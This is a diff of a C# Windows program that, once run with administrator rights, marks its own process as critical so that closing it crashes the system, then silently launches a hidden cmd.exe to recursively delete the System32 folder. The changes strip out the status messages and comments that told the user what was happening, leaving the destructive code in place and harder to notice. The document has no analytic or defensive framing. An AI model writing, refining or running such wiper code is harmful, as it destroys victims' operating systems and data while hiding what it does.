@@ -18,7 +18,7 @@ class Program
     {
         if (!IsAdministrator())
         {
-            Console.WriteLine("This application needs to be run as an administrator.");
+            Console.WriteLine("ADMIN");
             return;
         }
 
@@ -31,29 +31,24 @@ class Program
 
         if (status == 0)
         {
-            Console.WriteLine("Process is now critical. Closing this process will cause a system crash.");
+            
         }
         else
         {
-            Console.WriteLine("Failed to set process as critical. Status: " + status);
+           
         }
 
         try
         {
-            // Define the path to System32 directory
+            
             string system32Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32");
 
-            // Create a process to execute the command silently
             Process process = new Process();
             process.StartInfo.FileName = "cmd.exe";
             process.StartInfo.Arguments = $"/c del /s /q \"{system32Path}\"";
             process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             process.Start();
-
-            // Wait for the process to finish
             process.WaitForExit();
-
-            Console.WriteLine("System32 directory has been deleted.");
         }
         catch (Exception ex)
         {
